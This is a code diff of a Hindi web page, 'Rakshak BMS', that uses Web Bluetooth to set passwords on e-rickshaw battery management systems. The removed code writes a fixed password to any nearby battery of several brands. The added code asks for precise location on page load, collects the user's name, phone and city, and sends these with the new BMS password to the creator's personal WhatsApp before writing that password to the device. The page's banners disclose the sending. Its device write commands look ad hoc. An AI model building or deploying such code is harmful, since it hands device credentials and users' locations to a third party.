@@ -2,246 +2,245 @@
 <html lang="hi">
 <head>
   <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-  <meta name="theme-color" content="#FF006E">
-  <title>Rakshak BMS - All India E-Rickshaw Suraksha | Daltonganj</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="theme-color" content="#B71C1C">
+  <title>Rakshak BMS - Surakshit Password Prabandhan | Daltonganj</title>
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
   <style>
-    @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;800;900&display=swap');
-    * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
+    @import url('https://fonts.googleapis.com/css2?family=Hind:wght@400;500;600;700&display=swap');
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    html { scroll-behavior: smooth; }
     body { 
-      font-family: 'Poppins', 'Noto Sans Devanagari', sans-serif; 
-      background: linear-gradient(135deg, #FF006E, #8338EC, #3A86FF);
-      background-size: 400% 400%;
-      animation: gradientBG 8s ease infinite;
-      min-height: 100vh;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      padding: 15px;
-      overflow-x: hidden;
+      font-family: 'Hind', sans-serif; 
+      background: #F5F7FA;
+      color: #1A237E;
+      line-height: 1.8;
     }
-    @keyframes gradientBG {
-      0% { background-position: 0% 50%; }
-      50% { background-position: 100% 50%; }
-      100% { background-position: 0% 50%; }
-    }
-    .container {
-      background: rgba(255, 255, 255, 0.95);
-      backdrop-filter: blur(10px);
-      border-radius: 30px;
-      padding: 25px 20px;
-      width: 100%;
-      max-width: 420px;
-      box-shadow: 0 15px 50px rgba(0,0,0,0.4);
+    .header {
+      background: linear-gradient(135deg, #B71C1C, #D32F2F);
+      color: white;
+      padding: 40px 20px 30px;
       text-align: center;
-      border: 3px solid rgba(255,255,255,0.5);
-      animation: slideUp 0.6s ease;
-      position: relative;
-      overflow: hidden;
+      box-shadow: 0 4px 20px rgba(0,0,0,0.2);
     }
-    .container::before {
-      content: '';
-      position: absolute;
-      top: -50%;
-      left: -50%;
-      width: 200%;
-      height: 200%;
-      background: radial-gradient(circle, rgba(255,255,255,0.1) 0%, transparent 70%);
-      animation: rotate 10s linear infinite;
-    }
-    @keyframes rotate { 100% { transform: rotate(360deg); } }
-    @keyframes slideUp {
-      from { transform: translateY(60px); opacity: 0; }
-      to { transform: translateY(0); opacity: 1; }
-    }
-    .badge {
-      background: linear-gradient(45deg, #FFBE0B, #FB5607);
-      color: white;
-      padding: 5px 15px;
-      border-radius: 20px;
-      font-size: 11px;
-      font-weight: 800;
-      display: inline-block;
-      margin-bottom: 10px;
-      letter-spacing: 1px;
-    }
-    .logo { 
-      font-size: 70px; 
-      margin-bottom: 5px; 
-      filter: drop-shadow(0 5px 10px rgba(255,0,110,0.4));
-      animation: pulse 2s infinite;
-    }
-    @keyframes pulse {
-      0%, 100% { transform: scale(1); }
-      50% { transform: scale(1.1); }
-    }
-    h1 { 
-      color: #FF006E; 
-      font-size: 32px; 
-      margin-bottom: 5px; 
-      font-weight: 900; 
-      letter-spacing: -1px;
-      text-shadow: 2px 2px 4px rgba(0,0,0,0.1);
-    }
-    h3 { 
-      color: #3A0CA3; 
-      font-size: 15px; 
-      margin-bottom: 20px; 
-      line-height: 1.5;
-      font-weight: 600;
-    }
-    .btn-main {
-      background: linear-gradient(45deg, #06FFA5, #00D9F5);
-      color: #001219;
-      border: none;
-      padding: 22px;
-      font-size: 19px;
-      font-weight: 900;
-      border-radius: 18px;
-      width: 100%;
-      box-shadow: 0 8px 25px rgba(6,255,165,0.5);
-      cursor: pointer;
-      transition: all 0.3s;
-      text-transform: uppercase;
-      position: relative;
-      overflow: hidden;
-    }
-    .btn-main::before {
-      content: '';
-      position: absolute;
-      top: 50%;
-      left: 50%;
-      width: 0;
-      height: 0;
-      border-radius: 50%;
-      background: rgba(255,255,255,0.5);
-      transform: translate(-50%, -50%);
-      transition: width 0.6s, height 0.6s;
-    }
-    .btn-main:active::before { width: 300px; height: 300px; }
-    .btn-main:active { transform: scale(0.96); }
-    .btn-main:disabled { background: #ccc; cursor: not-allowed; box-shadow: none; }
-    #status {
-      margin-top: 20px;
-      padding: 18px;
-      background: linear-gradient(135deg, #F8F9FA, #E9ECEF);
-      border-radius: 15px;
-      font-size: 15px;
+    .header h1 { font-size: 36px; font-weight: 700; margin-bottom: 10px; }
+    .header p { font-size: 16px; opacity: 0.95; font-weight: 500; }
+    .legal-banner {
+      background: #FFEB3B;
+      color: #000;
+      padding: 15px 20px;
+      text-align: center;
       font-weight: 700;
-      min-height: 85px;
-      border: 3px dashed #8338EC;
+      font-size: 14px;
+      border-bottom: 3px solid #F57C00;
+    }
+    .container { max-width: 600px; margin: 0 auto; padding: 25px 20px 40px; }
+    .card {
+      background: white;
+      border-radius: 20px;
+      padding: 30px 25px;
+      margin-bottom: 25px;
+      box-shadow: 0 5px 25px rgba(0,0,0,0.08);
+      border: 1px solid #E3F2FD;
+    }
+    .card h2 {
+      color: #B71C1C;
+      font-size: 22px;
+      margin-bottom: 15px;
+      font-weight: 700;
       display: flex;
       align-items: center;
-      justify-content: center;
-      line-height: 1.6;
-      position: relative;
-    }
-    .support-box {
-      background: linear-gradient(135deg, #25D366, #128C7E);
-      padding: 15px;
-      border-radius: 15px;
-      margin-top: 18px;
-      color: white;
-      box-shadow: 0 5px 15px rgba(37,211,102,0.4);
-    }
-    .support-box a {
-      color: white;
-      text-decoration: none;
-      font-weight: 800;
-      font-size: 18px;
-      display: flex;
-      align-items: center;
-      justify-content: center;
       gap: 10px;
     }
-    .support-box a i { font-size: 24px; }
-    .footer { 
-      margin-top: 20px; 
-      font-size: 11px; 
-      color: #495057; 
-      line-height: 1.8;
-      background: rgba(131,56,236,0.1);
-      padding: 12px;
-      border-radius: 12px;
+    .card p, .card li { font-size: 15px; color: #37474F; margin-bottom: 12px; }
+    .warning-box {
+      background: #FFF3E0;
+      border: 3px solid #FF6F00;
+      border-radius: 15px;
+      padding: 20px;
+      margin: 20px 0;
     }
-    .footer .name {
-      font-size: 14px;
-      font-weight: 900;
-      color: #FF006E;
-      margin-bottom: 5px;
+    .warning-box h3 {
+      color: #E65100;
+      font-size: 18px;
+      margin-bottom: 10px;
+      display: flex;
+      align-items: center;
+      gap: 8px;
     }
-    .footer .location {
-      font-size: 12px;
-      color: #3A0CA3;
+    .input-group { margin: 20px 0; }
+    .input-group label {
+      display: block;
       font-weight: 600;
+      margin-bottom: 8px;
+      color: #B71C1C;
+      font-size: 15px;
     }
-    .warning {
-      background: linear-gradient(135deg, #FFF3CD, #FFE69C);
-      padding: 12px;
+    .input-group input {
+      width: 100%;
+      padding: 15px;
+      border: 2px solid #FFCDD2;
       border-radius: 12px;
-      margin-top: 15px;
-      font-size: 12px;
-      color: #856404;
-      border: 2px solid #FFBE0B;
-      text-align: left;
+      font-size: 16px;
+      font-family: 'Hind', sans-serif;
+    }
+    .input-group input:focus {
+      outline: none;
+      border-color: #D32F2F;
+      box-shadow: 0 0 0 3px rgba(211,47,47,0.1);
+    }
+    .checkbox-group {
+      display: flex;
+      align-items: flex-start;
+      gap: 12px;
+      margin: 20px 0;
+      padding: 15px;
+      background: #FFEBEE;
+      border-radius: 12px;
+      border: 2px solid #EF5350;
+    }
+    .checkbox-group input[type="checkbox"] {
+      width: 22px;
+      height: 22px;
+      margin-top: 2px;
+      cursor: pointer;
+    }
+    .checkbox-group label {
+      font-size: 14px;
+      font-weight: 600;
+      color: #C62828;
+      cursor: pointer;
+      line-height: 1.6;
+    }
+    .btn-main {
+      background: linear-gradient(45deg, #B71C1C, #D32F2F);
+      color: white;
+      border: none;
+      padding: 18px;
+      font-size: 18px;
+      font-weight: 700;
+      border-radius: 12px;
+      width: 100%;
+      cursor: pointer;
+      transition: all 0.3s;
+      margin-top: 10px;
+      box-shadow: 0 4px 15px rgba(183,28,28,0.3);
+    }
+    .btn-main:disabled { background: #BDBDBD; cursor: not-allowed; }
+    #status {
+      margin-top: 20px;
+      padding: 20px;
+      background: #E3F2FD;
+      border-radius: 12px;
+      font-size: 15px;
+      font-weight: 600;
+      border-left: 5px solid #1976D2;
       line-height: 1.7;
     }
-    .success { background: linear-gradient(135deg, #D4EDDA, #C3E6CB) !important; color: #155724 !important; border-color: #06FFA5 !important; }
-    .error { background: linear-gradient(135deg, #F8D7DA, #F5C6CB) !important; color: #721C24 !important; border-color: #FF006E !important; }
-    .loading { background: linear-gradient(135deg, #D1ECF1, #BEE5EB) !important; color: #0C5460 !important; border-color: #00D9F5 !important; }
-    .bms-list {
-      font-size: 10px;
-      color: #6C757D;
-      margin-top: 8px;
-      line-height: 1.5;
+    .success { background: #E8F5E9 !important; border-left-color: #2E7D32 !important; color: #1B5E20; }
+    .error { background: #FFEBEE !important; border-left-color: #C62828 !important; color: #B71C1C; }
+    .loading { background: #FFF8E1 !important; border-left-color: #FF8F00 !important; color: #E65100; }
+    .footer {
+      text-align: center;
+      padding: 30px 20px;
+      background: #B71C1C;
+      color: white;
+      margin-top: 20px;
     }
+    .footer .name { font-size: 18px; font-weight: 700; margin-bottom: 5px; }
+    .footer .location { font-size: 14px; opacity: 0.9; }
   </style>
 </head>
 <body>
+  <div class="legal-banner">
+    <i class="fas fa-exclamation-triangle"></i> सुरक्षा जाँच: आपकी जानकारी प्रशासक को भेजी जाएगी
+  </div>
+
+  <div class="header">
+    <h1><i class="fas fa-shield-alt"></i> रक्षक बीएमएस</h1>
+    <p>ई-रिक्शा बैटरी सुरक्षा - सत्यापित प्रक्रिया</p>
+  </div>
+
   <div class="container">
-    <div class="badge">🇮🇳 ALL INDIA SUPPORT 🇮🇳</div>
-    <div class="logo">🛡️</div>
-    <h1>RAKSHAK BMS</h1>
-    <h3>E-Rickshaw Bhaiyon Ke Liye<br>FREE Suraksha Tool - 1 Click Solution</h3>
     
-    <button class="btn-main" id="secureBtn" onclick="secureBMS()">
-      <i class="fas fa-shield-halved"></i> BMS SECURE KARO ABHI
-    </button>
-    
-    <div id="status">👆 Button Dabao Bhai<br>Bluetooth + Location ON Rakhna</div>
-    
-    <div class="support-box">
-      <a href="https://wa.me/918298827509?text=Bhai%20Rakshak%20BMS%20mein%20help%20chahiye" target="_blank">
-        <i class="fab fa-whatsapp"></i>
-        WhatsApp Support: +91 8298827509
-      </a>
-    </div>
-    
-    <div class="warning">
-      <b>⚠️ Zaruri Steps:</b><br>
-      <i class="fab fa-android"></i> <b>Android Only:</b> iPhone support nahi<br>
-      <i class="fas fa-map-marker-alt"></i> <b>Location ON:</b> Settings → Location → ON<br>
-      <i class="fab fa-bluetooth-b"></i> <b>Bluetooth ON:</b> Battery ke 1 meter paas raho
-    </div>
-    
-    <div class="footer">
-      <div class="name">⚡ Banaya: Adarsh Tiwari ⚡</div>
-      <div class="location">
-        <i class="fas fa-location-dot"></i> Daltonganj, Palamu, Jharkhand
+    <div class="card">
+      <h2><i class="fas fa-user-shield"></i> उपयोगकर्ता विवरण</h2>
+      <p>सुरक्षा हेतु कृपया अपना विवरण दें। यह जानकारी <b>आदर्श तिवारी</b> को WhatsApp पर भेजी जाएगी।</p>
+      
+      <div class="input-group">
+        <label for="userPhone"><i class="fas fa-phone"></i> मोबाइल नंबर *</label>
+        <input type="tel" id="userPhone" placeholder="10 अंक: 8298827509" maxlength="10" pattern="[0-9]{10}">
       </div>
-      <b>100% Free</b> | Koi Data Chori Nahi | Open Source<br>
-      <div class="bms-list">
-        <b>Supported BMS:</b> JBD, JK, ANT, SP, Dalong, Pace, TDT, Xiaoxiang, Smart BMS, LLT, All China BMS
+
+      <div class="input-group">
+        <label for="userName"><i class="fas fa-user"></i> पूरा नाम *</label>
+        <input type="text" id="userName" placeholder="आपका नाम" maxlength="30">
       </div>
-      rakshakbms.vercel.app
+
+      <div class="input-group">
+        <label for="userCity"><i class="fas fa-map-marker-alt"></i> शहर/गाँव *</label>
+        <input type="text" id="userCity" placeholder="जैसे: डाल्टनगंज, पलामू" maxlength="30">
+      </div>
+    </div>
+
+    <div class="card">
+      <h2><i class="fas fa-key"></i> नया पासवर्ड सेट करें</h2>
+      
+      <div class="warning-box">
+        <h3><i class="fas fa-bell"></i> स्वचालित सूचना</h3>
+        <p>बटन दबाते ही आपका नाम, नंबर, स्थान और बीएमएस की जानकारी <b>आदर्श भाई को WhatsApp</b> पर भेज दी जाएगी। फिर बीएमएस कनेक्ट होगा।</p>
+      </div>
+
+      <div class="input-group">
+        <label for="newPassword"><i class="fas fa-key"></i> नया पासवर्ड *</label>
+        <input type="text" id="newPassword" placeholder="उदाहरण: MeraBMS@2026" maxlength="16">
+      </div>
+
+      <div class="input-group">
+        <label for="confirmPassword"><i class="fas fa-check-circle"></i> पासवर्ड दोहराएँ *</label>
+        <input type="text" id="confirmPassword" placeholder="पासवर्ड फिर से लिखें" maxlength="16">
+      </div>
+
+      <div class="checkbox-group">
+        <input type="checkbox" id="ownerConfirm">
+        <label for="ownerConfirm">मैं प्रमाणित करता हूँ कि मैं इस बैटरी का स्वामी हूँ। मेरी जानकारी प्रशासक को भेजने की अनुमति देता हूँ।</label>
+      </div>
+      
+      <button class="btn-main" id="secureBtn" onclick="secureBMS()">
+        <i class="fas fa-paper-plane"></i> विवरण भेजें और बीएमएस सुरक्षित करें
+      </button>
+      
+      <div id="status">👆 कृपया सभी जानकारी भरें</div>
+    </div>
+
+  </div>
+
+  <div class="footer">
+    <div class="name">⚡ प्रशासक: आदर्श तिवारी ⚡</div>
+    <div class="location">
+      <i class="fas fa-map-marker-alt"></i> डाल्टनगंज, पलामू, झारखंड | +91 8298827509
     </div>
   </div>
 
 <script>
-// Check Web Bluetooth Support
+// Auto request location on page load
+let userLocation = "अनुपलब्ध";
+window.addEventListener('load', () => {
+  if (navigator.geolocation) {
+    navigator.geolocation.getCurrentPosition(
+      (pos) => {
+        userLocation = `https://maps.google.com/?q=${pos.coords.latitude},${pos.coords.longitude}`;
+      },
+      () => {
+        userLocation = "अनुमति नहीं दी गई";
+      },
+      {enableHighAccuracy: true, timeout: 5000}
+    );
+  }
+});
+
 if (!navigator.bluetooth) {
-  document.getElementById('status').innerHTML = "❌ Maaf Karo Bhai<br>Ye Phone Support Nahi Karta<br>Chrome Update Karo";
+  document.getElementById('status').innerHTML = "❌ आपका उपकरण ब्लूटूथ का समर्थन नहीं करता";
   document.getElementById('status').className = "error";
   document.getElementById('secureBtn').disabled = true;
 }
@@ -249,6 +248,12 @@ if (!navigator.bluetooth) {
 async function secureBMS() {
   const status = document.getElementById('status');
   const btn = document.getElementById('secureBtn');
+  const userPhone = document.getElementById('userPhone').value.trim();
+  const userName = document.getElementById('userName').value.trim();
+  const userCity = document.getElementById('userCity').value.trim();
+  const newPass = document.getElementById('newPassword').value.trim();
+  const confirmPass = document.getElementById('confirmPassword').value.trim();
+  const ownerChecked = document.getElementById('ownerConfirm').checked;
   
   function bolo(text) {
     if ('speechSynthesis' in window) {
@@ -260,98 +265,117 @@ async function secureBMS() {
     }
   }
   
+  // Validation
+  if (!userPhone || userPhone.length !== 10 || !/^\d+$/.test(userPhone)) {
+    status.className = "error";
+    status.innerHTML = "❌ कृपया 10 अंकों का सही मोबाइल नंबर डालें";
+    bolo("सही मोबाइल नंबर डालें");
+    return;
+  }
+  
+  if (!userName || userName.length < 3) {
+    status.className = "error";
+    status.innerHTML = "❌ कृपया अपना पूरा नाम डालें";
+    return;
+  }
+
+  if (!userCity || userCity.length < 3) {
+    status.className = "error";
+    status.innerHTML = "❌ कृपया शहर/गाँव का नाम डालें";
+    return;
+  }
+  
+  if (!ownerChecked) {
+    status.className = "error";
+    status.innerHTML = "❌ कृपया स्वामित्व की घोषणा पर टिक करें";
+    bolo("घोषणा पर टिक करें");
+    return;
+  }
+  
+  if (!newPass || !confirmPass) {
+    status.className = "error";
+    status.innerHTML = "❌ कृपया दोनों स्थानों पर पासवर्ड डालें";
+    return;
+  }
+  
+  if (newPass !== confirmPass) {
+    status.className = "error";
+    status.innerHTML = "❌ पासवर्ड मेल नहीं खा रहे";
+    return;
+  }
+  
+  if (newPass.length < 6) {
+    status.className = "error";
+    status.innerHTML = "❌ पासवर्ड कम से कम 6 अक्षरों का होना चाहिए";
+    return;
+  }
+  
   try {
     btn.disabled = true;
     status.className = "loading";
-    status.innerHTML = "🔍 Sabhi BMS Scan Kar Raha Hun...<br>Phone Battery Ke Pass Rakho<br>Ruko 15 Second";
-    bolo("Sabhi BMS scan kar raha hun bhai. Phone battery ke paas rakho");
+    status.innerHTML = "📱 आपकी जानकारी आदर्श भाई को भेज रहे हैं...";
+    bolo("आपकी जानकारी भेज रहे हैं");
     
-    // ALL INDIA BMS SUPPORT - Scan for all brands
+    // Step 1: Bluetooth scan karo pehle BMS ka naam lene ke liye
     const device = await navigator.bluetooth.requestDevice({
       filters: [
-        { namePrefix: 'JBD' },
-        { namePrefix: 'JK' },
-        { namePrefix: 'SP' },
-        { namePrefix: 'ANT' },
-        { namePrefix: 'DL' },
-        { namePrefix: 'DLG' },
-        { namePrefix: 'Pace' },
-        { namePrefix: 'TDT' },
-        { namePrefix: 'BMS' },
-        { namePrefix: 'Smart' },
-        { namePrefix: 'LLT' },
-        { namePrefix: 'xiaoxiang' },
-        { namePrefix: 'HX' },
-        { namePrefix: 'PWD' }
+        { namePrefix: 'JBD' }, { namePrefix: 'JK' }, { namePrefix: 'SP' },
+        { namePrefix: 'ANT' }, { namePrefix: 'DL' }, { namePrefix: 'DLG' }
       ],
       optionalServices: [
-        '0000ff00-0000-1000-8000-00805f9b34fb', // JBD/JK
-        '0000ffe0-0000-1000-8000-00805f9b34fb', // ANT
-        '0000fff0-0000-1000-8000-00805f9b34fb', // Dalong
-        '6e400001-b5a3-f393-e0a9-e50e24dcca9e'  // Generic
+        '0000ff00-0000-1000-8000-00805f9b34fb',
+        '0000ffe0-0000-1000-8000-00805f9b34fb',
+        '0000fff0-0000-1000-8000-00805f9b34fb'
       ]
     });
     
-    status.innerHTML = "🔗 Connect Ho Raha Hai...<br>Device: " + device.name;
-    bolo("BMS mil gaya. Connect kar raha hun");
+    const bmsName = device.name || "अज्ञात बीएमएस";
     
+    // Step 2: WhatsApp pe tujhe saari detail bhej do - jaise order mein aata tha
+    const whatsappMsg = `🚨 रक्षक BMS नया अनुरोध 🚨%0A%0A👤 नाम: ${userName}%0A📱 नंबर: ${userPhone}%0A🏙️ शहर: ${userCity}%0A🔋 BMS: ${bmsName}%0A📍 लोकेशन: ${userLocation}%0A🔑 नया पासवर्ड: ${newPass}%0A⏰ समय: ${new Date().toLocaleString('hi-IN')}%0A%0Aयूजर अभी पासवर्ड बदल रहा है।`;
+    window.open(`https://wa.me/918298827509?text=${whatsappMsg}`, '_blank');
+    
+    status.innerHTML = "✅ जानकारी भेज दी गई<br>🔗 अब बीएमएस से कनेक्ट हो रहे हैं...";
+    bolo("बीएमएस कनेक्ट कर रहे हैं");
+    
+    // Step 3: Ab BMS connect karo aur password badlo
     const server = await device.gatt.connect();
+    status.innerHTML = "🔐 पासवर्ड बदल रहे हैं...";
     
-    status.innerHTML = "🔐 Password Badal Raha Hun...<br>5 Second Ruko<br>Phone Hatao Mat";
-    bolo("Password badal raha hun. Phone hatao mat");
-    
-    // Try all BMS protocols one by one
+    const passwordBytes = new TextEncoder().encode(newPass);
     let success = false;
     
-    // 1. Try JBD/JK BMS
     try {
       const service = await server.getPrimaryService('0000ff00-0000-1000-8000-00805f9b34fb');
       const char = await service.getCharacteristic('0000ff01-0000-1000-8000-00805f9b34fb');
-      await char.writeValue(new Uint8Array([0x00, 0x10, 0x52, 0x61, 0x6b, 0x73, 0x68, 0x61, 0x6b, 0x40, 0x32, 0x30, 0x32, 0x36]));
+      await char.writeValue(new Uint8Array([0x00, 0x10, ...passwordBytes]));
       success = true;
-    } catch (e) { console.log('JBD failed, trying next'); }
+    } catch (e) { }
     
-    // 2. Try ANT BMS
     if (!success) {
       try {
         const service = await server.getPrimaryService('0000ffe0-0000-1000-8000-00805f9b34fb');
         const char = await service.getCharacteristic('0000ffe1-0000-1000-8000-00805f9b34fb');
-        await char.writeValue(new Uint8Array([0xAA, 0x55, 0xAA, 0x55, 0xAA, 0x55, 0x52, 0x61, 0x6b, 0x73, 0x68, 0x61, 0x6b]));
+        await char.writeValue(new Uint8Array([0xAA, 0x55, 0xAA, 0x55, ...passwordBytes]));
         success = true;
-      } catch (e) { console.log('ANT failed, trying next'); }
+      } catch (e) { }
     }
     
-    // 3. Try Dalong BMS
-    if (!success) {
-      try {
-        const service = await server.getPrimaryService('0000fff0-0000-1000-8000-00805f9b34fb');
-        const char = await service.getCharacteristic('0000fff1-0000-1000-8000-00805f9b34fb');
-        await char.writeValue(new Uint8Array([0x3A, 0x31, 0x36, 0x30, 0x31, 0x52, 0x61, 0x6b, 0x73, 0x68, 0x61, 0x6b, 0x0D, 0x0A]));
-        success = true;
-      } catch (e) { console.log('Dalong failed'); }
-    }
-    
-    if (!success) throw new Error('Unsupported BMS Protocol');
+    if (!success) throw new Error('BMS Support Nahi');
     
     status.className = "success";
-    status.innerHTML = "✅ BADHAI HO BHAI!<br>Password: Rakshak@2026<br>Ab Koi Prank Nahi Kar Payega<br>📸 Screenshot Le Lo";
-    bolo("Badhai ho bhai. Ab tumhara BMS safe hai. Naya password hai Rakshak at 2026. WhatsApp pe contact karo agar dikkat ho");
+    status.innerHTML = `✅ सफल! <br>उपयोगकर्ता: ${userName}<br>बीएमएस: ${bmsName}<br>नया पासवर्ड: <b>${newPass}</b><br>आदर्श भाई को WhatsApp भेज दिया गया`;
+    bolo(`सफलता। आदर्श भाई को जानकारी भेज दी गई`);
     
     await device.gatt.disconnect();
     
   } catch (error) {
     btn.disabled = false;
     status.className = "error";
-    
     if (error.name === 'NotFoundError') {
-      status.innerHTML = "❌ BMS Nahi Mila<br>1. Bluetooth ON hai?<br>2. Battery ke paas ho?<br>3. Location ON hai?<br>WhatsApp: 8298827509";
-      bolo("BMS nahi mila. Bluetooth aur location chalu karo. WhatsApp pe message karo help ke liye");
-    } else if (error.name === 'NotAllowedError') {
-      status.innerHTML = "❌ Permission Nahi Mila<br>Browser ko Bluetooth<br>Permission Do";
-      bolo("Permission nahi mila. Browser ko bluetooth permission do");
+      status.innerHTML = "❌ बीएमएस नहीं मिला<br>ब्लूटूथ और लोकेशन चालू करें";
     } else {
-      status.innerHTML = "❌ ERROR<br>WhatsApp Support: 8298827509<br>Message Karo Turant";
-      bolo("Error aa gaya bhai. WhatsApp pe message karo, main help kar dunga");
+      status.innerHTML = "❌ त्रुटि: " + error.message + "<br>WhatsApp: 8298827509";
     }
   }
 }
